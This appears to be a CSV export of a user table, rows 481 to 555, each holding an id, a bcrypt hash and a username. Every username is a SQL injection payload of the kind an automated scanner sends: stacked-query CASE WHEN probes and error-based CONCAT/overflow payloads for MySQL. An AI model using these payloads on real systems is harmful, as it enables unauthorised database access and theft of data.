481,$2b$12$X/4gdj6eFTifPx2KI1I/qOxrWvYGluv/BKTw4TS6c4bVpoL7S8Erm,"adminaa',(SELECT (CASE WHEN (8855=7966) THEN 0x61646d696e6161 ELSE 8855*(SELECT 8855 FROM INFORMATION_SCHEMA.PLUGINS) END))-- jQnn"
482,$2b$12$TgMGjwzh9YZlSSk54jwRTe2b1zULW6AmlVGn7EwIlRPEnDuov/ESi,"adminaa',(SELECT (CASE WHEN (9340=9340) THEN 0x61646d696e6161 ELSE 9340*(SELECT 9340 FROM INFORMATION_SCHEMA.PLUGINS) END))-- DhLd"
483,$2b$12$/SW9C6CQIikuXY7FOJzu3OO9ATdVsqTD.LyYwt7TZVFRJW2xLXAKy,"adminaa,(SELECT (CASE WHEN (3025=3271) THEN 0x61646d696e6161 ELSE 3025*(SELECT 3025 FROM INFORMATION_SCHEMA.PLUGINS) END))"
484,$2b$12$uhrl4dfJHj7hO.pgnOBF9OnWT8q80H2kKyM9SIT/.UPpRlA6ChuAu,"adminaa,(SELECT (CASE WHEN (9340=9340) THEN 0x61646d696e6161 ELSE 9340*(SELECT 9340 FROM INFORMATION_SCHEMA.PLUGINS) END))"
485,$2b$12$JnHpaPp9aTEe.fmJ3pTNq.sEdx/bvCV4/MCMW6JBXRrhLEjOvEsXu,adminaa);SELECT (CASE WHEN (6323=7633) THEN 6323 ELSE 6323*(SELECT 6323 FROM INFORMATION_SCHEMA.PLUGINS) END)#
486,$2b$12$QstyZmetv56O4FTvQqsV4u4gU.XNP5uDJ7atCAO6KEuUL9nzZVEeW,adminaa);SELECT (CASE WHEN (3181=3181) THEN 3181 ELSE 3181*(SELECT 3181 FROM INFORMATION_SCHEMA.PLUGINS) END)#
487,$2b$12$FDl4Oq7KGv8WGEKI.wtzxO1LtVMX0k9xfDkaULU.XEou/ndyeKDum,adminaa');SELECT (CASE WHEN (2388=3721) THEN 2388 ELSE 2388*(SELECT 2388 FROM INFORMATION_SCHEMA.PLUGINS) END)#
488,$2b$12$dVmN839hFmMZR6YDWABA9O11fQI3sps208uqMCYvdkTxkMYVvzM8W,adminaa');SELECT (CASE WHEN (3181=3181) THEN 3181 ELSE 3181*(SELECT 3181 FROM INFORMATION_SCHEMA.PLUGINS) END)#
489,$2b$12$P0qfqoWqcABy4P9W4uw1GekgR4gvoPQK1hYhszcDunqawz2/uw59q,adminaa';SELECT (CASE WHEN (2552=8475) THEN 2552 ELSE 2552*(SELECT 2552 FROM INFORMATION_SCHEMA.PLUGINS) END)#
490,$2b$12$CQ54Na8A9NYZqafq5aYwr.FUHFoFODuPIyESAm/RuCcPA0/xAP5Qe,adminaa';SELECT (CASE WHEN (3181=3181) THEN 3181 ELSE 3181*(SELECT 3181 FROM INFORMATION_SCHEMA.PLUGINS) END)#
491,$2b$12$LO.8YV3euoLebUSmCpFk5ODxwPGXDq9ntl1GwIXfC2j6A5O1ubkai,adminaa));SELECT (CASE WHEN (9988=7844) THEN 9988 ELSE 9988*(SELECT 9988 FROM INFORMATION_SCHEMA.PLUGINS) END)#
492,$2b$12$o52Ktv7TkzeGZrTEwWOpK.xGGUAnmuGOOvjQC16EJADxAV0ptf8uq,adminaa));SELECT (CASE WHEN (3181=3181) THEN 3181 ELSE 3181*(SELECT 3181 FROM INFORMATION_SCHEMA.PLUGINS) END)#
493,$2b$12$YLydsQjRXKjqfl/a8fJmZeTLOdrevACyJYSwZmaQ0b8rCFJKZ6Q82,adminaa)));SELECT (CASE WHEN (4773=8738) THEN 4773 ELSE 4773*(SELECT 4773 FROM INFORMATION_SCHEMA.PLUGINS) END)#
494,$2b$12$rc2XkNXG0VrqP3J2o2JPx.rbnO2vj.eKzxaWuINo3cNs4BFWLN39q,adminaa)));SELECT (CASE WHEN (3181=3181) THEN 3181 ELSE 3181*(SELECT 3181 FROM INFORMATION_SCHEMA.PLUGINS) END)#
495,$2b$12$6V7rJ8ZVKHRj0todTzZWruNpka6UxujYPJjS2bwpdyJFztWEBTD5K,adminaa;SELECT (CASE WHEN (5837=3081) THEN 5837 ELSE 5837*(SELECT 5837 FROM INFORMATION_SCHEMA.PLUGINS) END)#
496,$2b$12$ELRnF7.GmT2Rwndv1IBCtOzAfMH6byZ4cEJzQJsxSrx92J2.trwVy,adminaa;SELECT (CASE WHEN (3181=3181) THEN 3181 ELSE 3181*(SELECT 3181 FROM INFORMATION_SCHEMA.PLUGINS) END)#
497,$2b$12$GumTjYY6G2k72KWPXVaC/ux7NTQ5TnxOIQppTAZm1u9vTtAGgYdyq,adminaa'));SELECT (CASE WHEN (9126=3672) THEN 9126 ELSE 9126*(SELECT 9126 FROM INFORMATION_SCHEMA.PLUGINS) END)#
498,$2b$12$rl4AVB6T7OCbLFjzKZP3We0Sn40NKkW/WjNthDUBZNnlZ3Lqm18ES,adminaa'));SELECT (CASE WHEN (3181=3181) THEN 3181 ELSE 3181*(SELECT 3181 FROM INFORMATION_SCHEMA.PLUGINS) END)#
499,$2b$12$aUgg2UIEz5IC5E/anTg8qO1OJN3WsIlWjEvx.RpgAtJ3wxW/w2shK,adminaa')));SELECT (CASE WHEN (9277=7523) THEN 9277 ELSE 9277*(SELECT 9277 FROM INFORMATION_SCHEMA.PLUGINS) END)#
500,$2b$12$mhneH00ZmttYYzPS6dZ26.pEdMK7TPvxWKWW6o2WV/WwLcRw.0cx2,adminaa')));SELECT (CASE WHEN (3181=3181) THEN 3181 ELSE 3181*(SELECT 3181 FROM INFORMATION_SCHEMA.PLUGINS) END)#
501,$2b$12$LCXpUBvqyLfkWROdWSogF.Ik1U7IodfNSKx7UzkH5u6uXIUxbRKkq,adminaa')) AS DMOg WHERE 3228=3228;SELECT (CASE WHEN (8860=7046) THEN 8860 ELSE 8860*(SELECT 8860 FROM INFORMATION_SCHEMA.PLUGINS) END)#
502,$2b$12$9mgeMv9e9wzAU4pPpDkoiuS3VE.AwpP13I5tDlv9IphNZaAGhohhy,adminaa')) AS wMHl WHERE 7269=7269;SELECT (CASE WHEN (3181=3181) THEN 3181 ELSE 3181*(SELECT 3181 FROM INFORMATION_SCHEMA.PLUGINS) END)#
503,$2b$12$KDN1jHbMcStkueaIvSn5TOJKnRbpD1N/0NVUsZghiCsBieGizdBby,adminaa)) AS tIpl WHERE 3378=3378;SELECT (CASE WHEN (2704=2725) THEN 2704 ELSE 2704*(SELECT 2704 FROM INFORMATION_SCHEMA.PLUGINS) END)#
504,$2b$12$avaHsf0E2aUyaEmuT4n33u3rhdzPt60KE6BUCglF4Ygma6MO8jk12,adminaa)) AS rhkD WHERE 9786=9786;SELECT (CASE WHEN (3181=3181) THEN 3181 ELSE 3181*(SELECT 3181 FROM INFORMATION_SCHEMA.PLUGINS) END)#
505,$2b$12$GFFjXeDClLjPY95lnKT3DOPZX9O648eEmreP7zTfYl3Johid5PENC,adminaa') AS qVkA WHERE 3874=3874;SELECT (CASE WHEN (6208=7932) THEN 6208 ELSE 6208*(SELECT 6208 FROM INFORMATION_SCHEMA.PLUGINS) END)#
506,$2b$12$O/rsM6MRM/Ha5TB1dniyzuAKARdCLMnFcf2S8HvF1PwwMZKwucvoW,adminaa') AS gzrL WHERE 5348=5348;SELECT (CASE WHEN (3181=3181) THEN 3181 ELSE 3181*(SELECT 3181 FROM INFORMATION_SCHEMA.PLUGINS) END)#
507,$2b$12$zmbyLXWJgImaMkXAbg3Pbe/sLagT0FaInPeG/2NqoELphkHKPGrIu,adminaa) AS KxJW WHERE 6883=6883;SELECT (CASE WHEN (3535=9798) THEN 3535 ELSE 3535*(SELECT 3535 FROM INFORMATION_SCHEMA.PLUGINS) END)#
508,$2b$12$iFIo7ZJHYivOCiMOKDyZa.2r0wZUmd.h2NfX8JpitzB8eRP9mbeMm,adminaa) AS OBbz WHERE 8367=8367;SELECT (CASE WHEN (3181=3181) THEN 3181 ELSE 3181*(SELECT 3181 FROM INFORMATION_SCHEMA.PLUGINS) END)#
509,$2b$12$frOHGxfXhynVAwseQOW/HuSF0WXNs2rN4CaQBuLkkvBLTaMNqRNs.,adminaa` WHERE 9094=9094;SELECT (CASE WHEN (5376=5873) THEN 5376 ELSE 5376*(SELECT 5376 FROM INFORMATION_SCHEMA.PLUGINS) END)#
510,$2b$12$5eAroWDSLZ894qnAzBBoHOdaAkXgR194W4PhWbaF7FdI4Cx0yMS8K,adminaa` WHERE 1944=1944;SELECT (CASE WHEN (3181=3181) THEN 3181 ELSE 3181*(SELECT 3181 FROM INFORMATION_SCHEMA.PLUGINS) END)#
511,$2b$12$jLh3wq8M8NaE4tI8TdgSxuHnJ1UQXqFtXicWyEecgmQGKClfGOK8u,adminaa`) WHERE 8426=8426;SELECT (CASE WHEN (3290=5596) THEN 3290 ELSE 3290*(SELECT 3290 FROM INFORMATION_SCHEMA.PLUGINS) END)#
512,$2b$12$b7yZY4/A0uhJKTY9kLHY3.nHkRGi5koWOpLFgJWoq6RPlzidHKOXS,adminaa`) WHERE 3088=3088;SELECT (CASE WHEN (3181=3181) THEN 3181 ELSE 3181*(SELECT 3181 FROM INFORMATION_SCHEMA.PLUGINS) END)#
513,$2b$12$WIj8Gvw12MFsSLtFk0qlK.SCVWWKy9kuJK6cfMofx10Di.USdDwtG,adminaa`=`adminaa`;SELECT (CASE WHEN (2764=5886) THEN 2764 ELSE 2764*(SELECT 2764 FROM INFORMATION_SCHEMA.PLUGINS) END)#
514,$2b$12$cK/q.9c90Y17G4vYTmciaetWc6EZLTNhKvlE21okPDyte/Fc0Jpsi,adminaa`=`adminaa`;SELECT (CASE WHEN (3181=3181) THEN 3181 ELSE 3181*(SELECT 3181 FROM INFORMATION_SCHEMA.PLUGINS) END)#
515,$2b$12$fVO9mBHaXioBLOLt/yIklet4ey/uicJjlt2PdIqHJVr/SKZ3zbY82,adminaa]-(SELECT 0 WHERE 5095=5095;SELECT (CASE WHEN (3930=3747) THEN 3930 ELSE 3930*(SELECT 3930 FROM INFORMATION_SCHEMA.PLUGINS) END)#
516,$2b$12$TMacEfPOYO6IDJ2Zm4w5XuldlBgO.nQbUIY3jxIuOMYoi9HT/6x0i,adminaa]-(SELECT 0 WHERE 6973=6973;SELECT (CASE WHEN (3181=3181) THEN 3181 ELSE 3181*(SELECT 3181 FROM INFORMATION_SCHEMA.PLUGINS) END)#
517,$2b$12$HyedwL.79O0Pn5cptV07wurcZGlMOnM1Bw3Yh5MbB0x3ReXVnnnE2,adminaa' IN BOOLEAN MODE);SELECT (CASE WHEN (6622=7614) THEN 6622 ELSE 6622*(SELECT 6622 FROM INFORMATION_SCHEMA.PLUGINS) END)#
518,$2b$12$ZbkHK0iOFOaO3/g3UkEo8uX3pO4ZtZYW2LG8MxFT/nX9sJC.bPZC2,adminaa' IN BOOLEAN MODE);SELECT (CASE WHEN (3181=3181) THEN 3181 ELSE 3181*(SELECT 3181 FROM INFORMATION_SCHEMA.PLUGINS) END)#
519,$2b$12$d.OFocyaf6XouW1kZ8i80uipougqzN90b1A0.RzDWmI53CqlOdH0.,"adminaa) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610)))-- rcOz"
520,$2b$12$i0x6ncOqQ3SJH527Cp9AaugpBOhiuPzObYb0G8BrjdsPLM2lWqUMu,"adminaa') AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610)))-- qNyK"
521,$2b$12$sLnbLDFOTbRvgshvEnxpducnHgRzcz6OxzzevqBp/i9yCOz0m2ibW,"adminaa' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610)))-- gPzu"
522,$2b$12$3nJlE/QLryZqlvEuqSxZhOsQwdwCbl3lHRucckp.uAHRRU4Cg2TDe,"adminaa) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610))) AND (1134=1134"
523,$2b$12$0bmEGj5MHxY.QbmIXgZsYu3MDXfLk7PobrxhkqiGfGRsZAVqP.mqS,"adminaa)) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((6759=6759"
524,$2b$12$APjxE3rn9myLQVkOEQJUqeRK0.KSVbf5Kk5WIkaEvmtM/bMHkaDUG,"adminaa))) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610))) AND (((7339=7339"
525,$2b$12$gZY9j4Lom1TbOWtywWO1BujAka33EWriFuRZrUKQsmu7gs30mJp3.,"adminaa AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610)))"
526,$2b$12$KFXol9zV3uikEXhfjGCu/OAHwIuqI6omKHpXSD57a.PrRkMY/O77C,"adminaa') AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610))) AND ('myyj'='myyj"
527,$2b$12$OKVmPWGUg9vJfC6hx6Jz2e71CQx3dscsDDtmEmvdfO.jRw/HyLcSy,"adminaa')) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610))) AND (('PSmd'='PSmd"
528,$2b$12$1Ah1QPKb5GfZ7DjHVUZuP.9RVbSsi/nGQ2rnuIDX3jwMW5kwrH9iW,"adminaa'))) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((('JjYl'='JjYl"
529,$2b$12$U543FkBwzU3xzpwGk9aBAe3koFhSjXuC4nbppMpbdG8RU37MigWC6,"adminaa' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'TUWd'='TUWd"
530,$2b$12$7NNpG9YzO.S8Kq82c/xd4ukzhoihEMXhprbHjhk7n3BvZDAzuQv6y,"adminaa') AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610))) AND ('XnHg' LIKE 'XnHg"
531,$2b$12$60/5IeMXxiipDiGSTHzQAeR1p/AiXVzQfezCzxCSEci2pwH.kAU8u,"adminaa')) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610))) AND (('hmHX' LIKE 'hmHX"
532,$2b$12$e5sxO39i9MkK6lq0j57ZSOtHEJHqvSXQy2MPmW77vNKyFk0Vxh5NS,"adminaa'))) AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610))) AND ((('ogbd' LIKE 'ogbd"
533,$2b$12$9GOVbdnDZECrocCfDbO3Iukm8P3hd0m4raRDeViMYh9Cfl88kXZRW,"adminaa' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'LWiQ' LIKE 'LWiQ"
534,$2b$12$bGxwINOjFkHdOqkMIzaFGOAwhk0LwIPm9wGRl9Qt8RfcltmBYU/.u,"adminaa AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610)))-- KPjo"
535,$2b$12$F8/lYZnrYLtZZ0MGFImN4uxIqkkml/mvjoa80dFkAxQCBsE.CfgES,"adminaa AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610)))# lyBl"
536,$2b$12$qHq2kLwyPFTRYDL3eHP4oOUiXdMMpOrEz5p6roWISSxTYe.sMSWXm,"adminaa' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610))) OR 'zKlc'='uTLa"
537,$2b$12$06/VnAvnYVRib/7uY5G7few7lgLXV8L98gblakciVwCPho4OiC3nC,"adminaa') WHERE 2141=2141 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610)))-- UuVf"
538,$2b$12$d5gsvbPvAB6uFuuJn11YCecHCvTRruNff/7YU7E1BEslq6dyp1UTy,"adminaa) WHERE 8157=8157 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610)))-- uOTR"
539,$2b$12$odgWu8/vChgWfHyFylbTpOkWDYuVpdMZ.5lGCi5/BiMuWjNf0yEma,"adminaa' WHERE 6278=6278 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610)))-- EmcD"
540,$2b$12$XFqC/k1wKpOJv5nNs3am6eGTgBN0vkOQ3wysF2izE6H.QsmSSHc8i,"adminaa WHERE 2310=2310 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610)))-- SNqV"
541,$2b$12$vSimtm9RPH82/vomoZKJ3ufvWBfsF.yGvcu8uYbVqnasXlYVsB9U6,"adminaa'||(SELECT 0x464c566d WHERE 1360=1360 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610))))||'"
542,$2b$12$Gt.t4CKWR0tCmA77pwVuBOawyPDnw0MY.F8Ya/h10B4BLNai9KbyK,"adminaa'||(SELECT 0x7a525041 FROM DUAL WHERE 6622=6622 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610))))||'"
543,$2b$12$wtx1i2u7PYyV16Cc7DraWu5twotb3.xC.U7z.jppyKEddp0GYV4/W,"adminaa'+(SELECT 0x58797578 WHERE 7309=7309 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610))))+'"
544,$2b$12$9l6xxcf7LEHO2V6gNDluWeUqadzwE9Oq9RmfDptNAoWeZ2MNmzLRy,"adminaa||(SELECT 0x6b675357 FROM DUAL WHERE 9234=9234 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610))))||"
545,$2b$12$ikiD.EitYpRX.gl/OQ6qm.zjrrGEiArmjcMi0JwwxMKd1sigXYEK.,"adminaa||(SELECT 0x6e435143 WHERE 6146=6146 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610))))||"
546,$2b$12$MmNch2UlPGf9IqUDq5Jsy.FHP5j0kKNNmZSDqFhuED2jUWl1Z9tEC,"adminaa+(SELECT dgfC WHERE 6937=6937 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610))))+"
547,$2b$12$7yixm6IInEOYd/ne58DyfezAs1RrFvmpQ.vo9/Riuu0riyap8V2my,"adminaa+(SELECT 0x46537748 WHERE 5807=5807 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610))))+"
548,$2b$12$K2EXx9rG4LdxcrLdLTSFe.AWKk2RgzLoRuOCx4uB2seZjcfX/Hqdi,"adminaa')) AS Syzc WHERE 6805=6805 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610)))-- JqEz"
549,$2b$12$pf8QrOunzxR9/fQwDN1oIOEXMkPH3ra09gmbYPuEgKU7CMsrkYIHu,"adminaa)) AS JLRs WHERE 4027=4027 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610)))-- tMIN"
550,$2b$12$m7WPs2.vaH7gN7SlZfFlX.zUAofUQUbucYpxMnF/HgzIIv6ymU.K6,"adminaa') AS bJIa WHERE 7701=7701 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610)))-- iYPy"
551,$2b$12$rQyiLSzPOcJAqNWpGt7RQ.fvbW/njw4szNMSxjTKwYHfFfeLithCC,"adminaa) AS aNWI WHERE 5031=5031 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610)))-- rXkm"
552,$2b$12$GD9oXwExOGLZYZCV3mrJ2udHfR3zHNBDkNk8qendmB5rXo9iizMRu,"adminaa` WHERE 4218=4218 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610)))-- ytRL"
553,$2b$12$ywqDLqsfCPba4rRynRUZi.eNtbkHv8xG2K8AFSW8f9RWTatUHQcQG,"adminaa`) WHERE 2443=2443 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610)))-- WxPm"
554,$2b$12$66hE7ATcSgDwRNz9ORqk8uuQp/YD6plrXwAp3MrSNF.HJ86DDfG6e,"adminaa`=`adminaa` AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x71786a7071,(SELECT (ELT(5232=5232,1))),0x7162767071,0x78))s), 8446744073709551610, 8446744073709551610))) AND `adminaa`=`adminaa"
555,$2b$12$puiuJ4TWRWJCRAUDTNl5MOF6xRcutKW/E.9aZWC9Jlzoe5nPskmh.,"(SELECT CONCAT(0x71786a7071,(ELT(1512=1512,1)),0x7162767071))"

